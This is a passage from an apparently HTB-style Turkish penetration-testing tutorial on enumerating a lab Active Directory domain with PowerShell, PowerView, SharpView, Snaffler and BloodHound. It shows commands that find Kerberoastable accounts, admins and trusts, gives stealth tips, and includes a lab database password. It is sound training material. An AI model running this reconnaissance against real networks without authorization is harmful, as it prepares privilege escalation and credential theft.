SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

Bu, domain SID'si, domain işlev düzeyi, tüm child domain'ler ve daha fazlası gibi yararlı bilgileri yazdıracaktır. Ardından, [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet'ini kullanacağız. `ServicePrincipalName` özelliği doldurulmuş hesaplar için filtreleme yapacağız. Bu bize, bir sonraki bölümden sonra derinlemesine ele alacağımız Kerberoasting saldırısına duyarlı olabilecek hesapların bir listesini verecektir.


#### Get-ADUser
```powershell-session
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```

ActiveDirectory modülünü kullanarak yapabileceğimiz bir başka ilginç kontrol de [Get-ADTrust](“https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps”) cmdlet'ini kullanarak domain güven ilişkilerini doğrulamak olacaktır


#### **Güven İlişkilerini Kontrol Etme**

```powershell-session
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False  
```
Bu cmdlet, domainin sahip olduğu tüm güven ilişkilerini yazdıracaktır. Bunların ormanımız içinde mi yoksa diğer ormanlardaki domain'lerle mi güven ilişkisi olduğunu, güven türünü, güvenin yönünü ve ilişkinin olduğu domain'in adını belirleyebiliriz. Bu, daha sonra alt-üst güven ilişkilerinden yararlanmak ve orman güvenleri arasında saldırmak için yararlı olacaktır. Daha sonra, [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet'ini kullanarak AD grup bilgilerini toplayabiliriz.


#### Group Enumeration
```powershell-session
PS C:\htb> Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```

Belirli bir grup hakkında daha ayrıntılı bilgi almak için sonuçları alabilir ve ilginç isimleri cmdlet'e geri besleyebiliriz:

#### Detailed Group Info
```powershell-session
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```
Artık grup hakkında daha fazla bilgi sahibi olduğumuza göre, [Get-ADGroupMember](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps) cmdlet'ini kullanarak bir üye listesi alalım.


### Group Membership
```powershell-session
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

Bir hesabın, `backupagent`, bu gruba ait olduğunu görebiliriz. Bunu not etmekte fayda var çünkü bu servis hesabını bir saldırı yoluyla ele geçirebilirsek, Backup Operators grubundaki üyeliğini domain'i ele geçirmek için kullanabiliriz. Domain üyeliği kurulumunu tam olarak anlamak için bu işlemi diğer gruplar için de gerçekleştirebiliriz. İşlemi birkaç farklı grupla tekrarlamayı deneyin. Bu işlemin sıkıcı olabileceğini ve eleyecek çok büyük miktarda veriyle baş başa kalacağımızı göreceksiniz. Bunu ActiveDirectory PowerShell modülü gibi yerleşik araçlarla nasıl yapacağımızı bilmemiz gerekir, ancak bu bölümün ilerleyen kısımlarında BloodHound gibi araçların bu süreci ne kadar hızlandırabileceğini ve sonuçlarımızı çok daha doğru ve düzenli hale getirebileceğini göreceğiz.

Bir host üzerinde ActiveDirectory modülünü kullanmak, bir aracı bir host üzerine bırakmaktan veya belleğe yükleyip kullanmaya çalışmaktan daha gizli bir eylem gerçekleştirme yolu olabilir. Bu şekilde, eylemlerimiz potansiyel olarak daha fazla uyum sağlayabilir. Daha sonra, numaralandırmayı basitleştirmek ve domainin daha derinlerine inmek için birçok özelliğe sahip PowerView aracını inceleyeceğiz.

## **PowerView**  

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon), bir AD ortamında durumsal farkındalık kazanmamıza yardımcı olmak için PowerShell'de yazılmış bir araçtır. BloodHound'a çok benzer şekilde, kullanıcıların bir ağda nerede oturum açtığını belirlemek, kullanıcılar, bilgisayarlar, gruplar, ACLS, güvenler gibi domain bilgilerini numaralandırmak, dosya paylaşımlarını ve parolaları aramak, Kerberoasting gerçekleştirmek ve daha fazlasını yapmak için bir yol sağlar. Müşterimizin domain'inin güvenlik duruşu hakkında bize büyük bilgiler sağlayabilecek çok yönlü bir araçtır. Domain içindeki yanlış yapılandırmaları ve ilişkileri belirlemek için BloodHound'a göre daha fazla manuel çalışma gerektirir, ancak doğru kullanıldığında, ince yanlış yapılandırmaları belirlememize yardımcı olabilir.

PowerView'in bazı yeteneklerini inceleyelim ve hangi verileri döndürdüğünü görelim. Aşağıdaki tabloda PowerView'in sunduğu en kullanışlı işlevlerden bazıları açıklanmaktadır.



### Komutlar ve Açıklamaları:

- **Export-PowerViewCSV**: Sonuçları bir CSV dosyasına ekler.
- **ConvertTo-SID**: Bir kullanıcı veya grup adını SID değerine dönüştürür.
- **Get-DomainSPNTicket**: Belirtilen Service Principal Name (SPN) hesabı için Kerberos bileti talep eder.

### Domain/LDAP Fonksiyonları:

- **Get-Domain**: Mevcut (veya belirtilen) domain için AD (Active Directory) objesini döndürür.
- **Get-DomainController**: Belirtilen domain için Domain Controller listesini döndürür.
- **Get-DomainUser**: AD'deki tüm kullanıcıları veya belirli kullanıcı nesnelerini döndürür.
- **Get-DomainComputer**: AD'deki tüm bilgisayarları veya belirli bilgisayar nesnelerini döndürür.
- **Get-DomainGroup**: AD'deki tüm grupları veya belirli grup nesnelerini döndürür.
- **Get-DomainOU**: AD'deki tüm veya belirli Organizational Unit (OU) nesnelerini arar.
- **Find-InterestingDomainAcl**: Domain'deki, yerleşik olmayan objeler üzerinde değiştirme haklarına sahip ACL'leri bulur.
- **Get-DomainGroupMember**: Belirli bir domain grubunun üyelerini döndürür.
- **Get-DomainFileServer**: Dosya sunucusu olarak işlev gören sunucuların listesini döndürür.
- **Get-DomainDFSShare**: Mevcut (veya belirtilen) domain için tüm dağıtılmış dosya sistemlerini döndürür.

### GPO Fonksiyonları:

- **Get-DomainGPO**: AD'deki tüm Group Policy Object'lerini (GPO) veya belirli GPO nesnelerini döndürür.
- **Get-DomainPolicy**: Mevcut domain için varsayılan domain politikalarını veya domain controller politikasını döndürür.

### Bilgisayar Sayım Fonksiyonları:

- **Get-NetLocalGroup**: Yerel veya uzaktaki bir makinadaki yerel grupları listeler.
- **Get-NetLocalGroupMember**: Belirli bir yerel grubun üyelerini listeler.
- **Get-NetShare**: Yerel (veya uzaktaki) bir makinadaki açık paylaşımları döndürür.
- **Get-NetSession**: Yerel (veya uzaktaki) bir makinadaki oturum bilgilerini döndürür.
- **Test-AdminAccess**: Mevcut kullanıcının yerel (veya uzaktaki) bir makinaya yönetici erişimi olup olmadığını test eder.

### Threaded 'Meta' Fonksiyonları:

- **Find-DomainUserLocation**: Belirli kullanıcıların oturum açtığı makineleri bulur.
- **Find-DomainShare**: Domain makinelerindeki erişilebilir paylaşımları bulur.
- **Find-InterestingDomainShareFile**: Domain'deki okunabilir paylaşımlarda belirli kriterlere uyan dosyaları arar.
- **Find-LocalAdminAccess**: Mevcut kullanıcının yerel yönetici erişimine sahip olduğu domain makinelerini bulur.

### Domain Güven Fonksiyonları:

- **Get-DomainTrust**: Mevcut domain veya belirtilen domain için domain güven ilişkilerini döndürür.
- **Get-ForestTrust**: Mevcut orman (forest) veya belirtilen orman için tüm orman güven ilişkilerini döndürür.
- **Get-DomainForeignUser**: Kullanıcının domain dışındaki gruplarda bulunan kullanıcıları listeler.
- **Get-DomainForeignGroupMember**: Grubun domain dışındaki kullanıcılarıyla grupları listeler ve her yabancı üyeyi döndürür.
- **Get-DomainTrustMapping**: Mevcut domain ve görülen diğer domainler için tüm güven ilişkilerini listeler.


Bu tablo PowerView'in sunduklarının tamamını kapsamamaktadır, ancak tekrar tekrar kullanacağımız işlevlerin çoğunu içermektedir. PowerView hakkında daha fazla bilgi için [Active Directory PowerView modülüne](https://academy.hackthebox.com/course/preview/active-directory-powerview) göz atın. Aşağıda bunlardan birkaçını deneyeceğiz.  

İlk olarak [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) fonksiyonu. Bu bize tüm kullanıcılar veya belirlediğimiz belirli kullanıcılar hakkında bilgi sağlayacaktır. Aşağıda, belirli bir kullanıcı olan `mmorgan` hakkında bilgi almak için kullanacağız.


#### Domain User Information

```powershell-session
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

PowerView ile bazı temel kullanıcı bilgilerini gördük. Şimdi bazı domain grubu bilgilerini numaralandıralım. Gruba özgü bilgileri almak için [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/) işlevini kullanabiliriz. `Recurse` anahtarının eklenmesi, PowerView'e, hedef grubun parçası olan herhangi bir grup bulursa (iç içe grup üyeliği), bu grupların üyelerini listelemesini söyler. Örneğin, aşağıdaki çıktı `Secadmins` grubunun iç `içe` grup üyeliği aracılığıyla `Domain Admins` grubunun bir parçası olduğunu gösterir. Bu durumda, grup üyelikleri aracılığıyla Domain Admin haklarını devralan bu grubun tüm üyelerini görüntüleyebileceğiz.


#### Recursive Group Membership

```powershell-session
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>  
```

Yukarıda `Domain Admins` grubunun üyelerini listelemek için özyinelemeli bir görünüm gerçekleştirdik. Artık olası ayrıcalıkların yükseltilmesi için kimi hedefleyeceğimizi biliyoruz. AD PowerShell modülünde olduğu gibi, domain güven eşlemelerini de numaralandırabiliriz.


#### Trust Enumeration

```powershell-session
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM 
```

Test-AdminAccess fonksiyonunu, mevcut makinede ya da uzaktaki bir makinede lokal admin erişimini test etmek için kullanabiliriz.

#### Testing for Local Admin Access
```powershell-session
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 
```

Yukarıda, şu anda kullandığımız kullanıcının ACADEMY-EA-MS01 hostunda bir yönetici olduğunu belirledik. Yönetici erişimimizin olduğu yerleri görmek için aynı işlevi her host için gerçekleştirebiliriz. BloodHound'un bu tür bir kontrolü ne kadar iyi yaptığını daha sonra göreceğiz. Şimdi, hesabın bir Kerberoasting saldırısına maruz kalabileceğini gösteren SPN öznitelik kümesine sahip kullanıcıları kontrol edebiliriz.


#### **SPN Seti ile Kullanıcı Bulma**
```powershell-session
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

Kullanmakta rahat olana kadar aracın işlevlerini biraz daha test edin. Bu modülde ilerledikçe PowerView'i birkaç kez daha göreceğiz.


## **SharpView**  

PowerView artık kullanımdan kaldırılmış olan PowerSploit offensive PowerShell araç setinin bir parçasıdır. Araç, BC-Security tarafından [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) çerçevesinin bir parçası olarak güncellemeler almaktadır. Empire 4, BC-Security'nin orijinal Empire projesinin çatalı olup Nisan 2022 itibarıyla aktif olarak sürdürülmektedir. Bu modül boyunca PowerView'in geliştirme sürümünü kullanarak örnekler gösteriyoruz çünkü Active Directory ortamında keşif yapmak için mükemmel bir araçtır ve orijinal sürümün bakımı yapılmasa bile modern AD ağlarında hala son derece güçlü ve yararlıdır. [PowerView](“https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1”) 'in BC-SECURITY sürümü, bu modülün kapsamı dışında olan [Grup Yönetilen Hizmet Hesaplarını](“https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview”) aramak için kullanılan `Get-NetGmsa` gibi bazı yeni işlevlere sahiptir. Eski ve şu anda korunan sürümler arasındaki ince farkları görmek için her iki sürümle de oynamaya değer.  

Denemeye değer bir başka araç da PowerView'in .NET portu olan SharpView'dir. PowerView tarafından desteklenen aynı fonksiyonların çoğu SharpView ile kullanılabilir. Bir argüman listesi almak için `-Help` ile bir yöntem adı yazabiliriz.

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum> 
```

Burada, kontrol ettiğimiz kullanıcı `forend` gibi belirli bir kullanıcı hakkındaki bilgileri listelemek için SharpView'i kullanabiliriz.

```powershell-session
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

MS01 host üzerinde SharpView ile denemeler yapın ve mümkün olduğunca çok PowerView örneği oluşturun. Kaçınma bu modülün kapsamında olmasa da, bir istemci PowerShell kullanımına karşı güçlendirildiğinde veya PowerShell kullanmaktan kaçınmamız gerektiğinde SharpView yararlı olabilir.


## **Shares**  

Paylaşımlar, bir domain üzerindeki kullanıcıların günlük rolleriyle ilgili bilgilere hızlı bir şekilde erişmelerini ve içerikleri kuruluşlarıyla paylaşmalarını sağlar. Doğru şekilde ayarlandığında, domain paylaşımları bir kullanıcının domain'e katılmış olmasını ve sisteme erişirken kimlik doğrulaması yapmasını gerektirir. Kullanıcıların yalnızca günlük rolleri için gerekli olanlara erişebilmelerini ve bunları görebilmelerini sağlamak için izinler de mevcut olacaktır. Aşırı izin veren paylaşımlar, özellikle tıbbi, yasal, personel, İK, veri vb. içeren hassas bilgilerin yanlışlıkla ifşa edilmesine neden olabilir. Bir saldırıda, BT/altyapı paylaşımları gibi paylaşımlara erişebilen standart bir domain kullanıcısının kontrolünü ele geçirmek, yapılandırma dosyaları veya SSH anahtarları gibi kimlik doğrulama dosyaları ya da güvenli olmayan bir şekilde saklanan parolalar gibi hassas verilerin ifşa edilmesine yol açabilir.Müşterinin günlük işleri için erişmesi gerekmeyen kullanıcılara herhangi bir veriyi ifşa etmediğinden ve tabi oldukları yasal/düzenleyici gereklilikleri (HIPAA, PCI, vb.) karşıladıklarından emin olmak için bu gibi sorunları tespit etmek istiyoruz. Paylaşımları aramak için PowerView'i kullanabilir ve daha sonra bunları araştırmamıza yardımcı olabilir veya adında `pass` olan dosyalar gibi ortak dizeleri aramak için çeşitli manuel komutlar kullanabiliriz. Bu sıkıcı bir süreç olabilir ve özellikle büyük ortamlarda bazı şeyleri gözden kaçırabiliriz. Şimdi, `Snaffler` aracını keşfetmek için biraz zaman ayıralım ve bu sorunları daha doğru ve verimli bir şekilde tanımlamamıza nasıl yardımcı olabileceğini görelim.

## **Snaffler**  

[Snaffler](https://github.com/SnaffCon/Snaffler), Active Directory ortamında kimlik bilgilerini veya diğer hassas verileri elde etmemize yardımcı olabilecek bir araçtır. Snaffler, domain içindeki host'ların bir listesini alarak ve daha sonra bu host'ları paylaşımlar ve okunabilir dizinler için numaralandırarak çalışır. Bu yapıldıktan sonra, kullanıcımız tarafından okunabilen tüm dizinleri yineler ve değerlendirmedeki konumumuzu iyileştirmeye hizmet edebilecek dosyaları arar. Snaffler, domain'e bağlı bir host'tan ya da domain kullanıcısı bağlamında çalıştırılmasını gerektirir.  

Snaffler'ı çalıştırmak için aşağıdaki komutu kullanabiliriz:

#### Snaffler Execution
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
`-s` bizim için sonuçları konsola yazdırmasını söyler, `-d` içinde arama yapılacak domain'i belirtir ve `-o` Snaffler'a sonuçları bir log dosyasına yazmasını söyler. -v seçeneği verbosity seviyesidir. Tipik olarak `data` en iyisidir, çünkü sonuçları yalnızca ekrana görüntüler, bu nedenle araç çalıştırmalarına bakmaya başlamak daha kolaydır. Snaffler önemli miktarda veri üretebilir, bu nedenle genellikle dosyaya çıktı vermeli ve çalışmasına izin vermeli ve daha sonra geri dönmeliyiz. Snaffler ham çıktısını bir sızma testi sırasında müşterilere ek veri olarak sağlamak da yararlı olabilir, çünkü bu, öncelikle kilitlenmesi gereken yüksek değerli paylaşımları sıfırlamalarına yardımcı olabilir.


#### Snaffler in Action
![Pasted image 20241019212609.png](/img/user/resimler/Pasted%20image%2020241019212609.png)
Parolalar, SSH anahtarları, yapılandırma dosyaları ya da erişimimizi ilerletmek için kullanabileceğimiz diğer verileri bulabiliriz. Snaffler bizim için çıktıyı renklerle kodlar ve paylaşımlarda bulunan dosya türlerinin bir özetini sunar.  

Artık INLANEFREIGHT.LOCAL domain'i hakkında çok sayıda veriye sahip olduğumuza göre (ve umarım net notlar ve günlük dosyası çıktısı!), bunları ilişkilendirmek ve görselleştirmek için bir yola ihtiyacımız var. `BloodHound` 'u daha derinlemesine inceleyelim ve bu aracın AD odaklı güvenlik değerlendirmeleri sırasında ne kadar güçlü olabileceğini görelim.


### BloodHound  

Önceki bölümde tartışıldığı gibi `Bloodhound`, nesneler arasındaki ilişkileri analiz ederek bir AD ortamındaki saldırı yollarını belirleyebilen olağanüstü bir açık kaynak aracıdır. Hem sızma test uzmanları hem de mavi ekip üyeleri, etki alanındaki ilişkileri görselleştirmek için BloodHound'u kullanmayı öğrenmekten faydalanabilir. Doğru kullanıldığında ve özel Şifre sorgularıyla birleştirildiğinde BloodHound, domain'de yıllardır mevcut olan yüksek etkili ancak keşfedilmesi zor kusurları bulabilir.  

İlk olarak, ağ içinde konumlandırılmış (ancak domain'e bağlı olmayan) bir Windows attack host'undan domain kullanıcısı olarak kimlik doğrulaması yapmalı ya da aracı domain'e bağlı bir host'a aktarmalıyız. Bunu başarmanın [Dosya Aktarımı](https://academy.hackthebox.com/course/preview/file-transfers) modülünde ele alınan birçok yolu vardır. Bizim amaçlarımız doğrultusunda, saldırı hostunda bulunan SharpHound.exe ile çalışacağız, ancak Python HTTP sunucusu, Impacket'ten smbserver.py gibi yöntemler kullanarak aracı Pwnbox'tan veya kendi sanal makinemizden saldırı hostuna aktarmayı denemeye değer.

SharpHound'u `--help` seçeneği ile çalıştırırsak, kullanabileceğimiz seçenekleri görebiliriz.

#### SharpHound in Action
![Pasted image 20241019212934.png](/img/user/resimler/Pasted%20image%2020241019212934.png)

MS01 saldırı hostundan SharpHound.exe toplayıcısını çalıştırarak başlayacağız.

![Pasted image 20241019213004.png](/img/user/resimler/Pasted%20image%2020241019213004.png)

Ardından, veri kümesini kendi sanal makinemize sızdırabilir veya MS01'deki BloodHound GUI aracına alabiliriz. Bunu MS01'de bir CMD veya PowerShell konsoluna `bloodhound` yazarak yapabiliriz. Kimlik bilgileri kaydedilmelidir, ancak bir istem görünürse `neo4j: HTB_@cademy_stdnt!` girin. Ardından, sağ taraftaki `Upload Data (Veri Yükle` ) düğmesine tıklayın, yeni oluşturulan zip dosyasını seçin ve `Open (Aç`) düğmesine tıklayın. Bir `Upload Progress` penceresi açılacaktır. Tüm .json dosyaları %100 tamamlanmış göründüğünde, bu pencerenin üst kısmındaki X işaretine tıklayın.  

Sol üstteki arama çubuğuna `domain:` yazarak ve sonuçlardan `INLANEFREIGHT.LOCAL` 'ı seçerek başlayabiliriz `.` Düğüm bilgisi sekmesine göz atmak için bir dakikanızı ayırın. Gördüğümüz gibi, bu hedeflenecek 550'den fazla hostu olan oldukça büyük bir şirket ve diğer iki domain ile güveniyor.

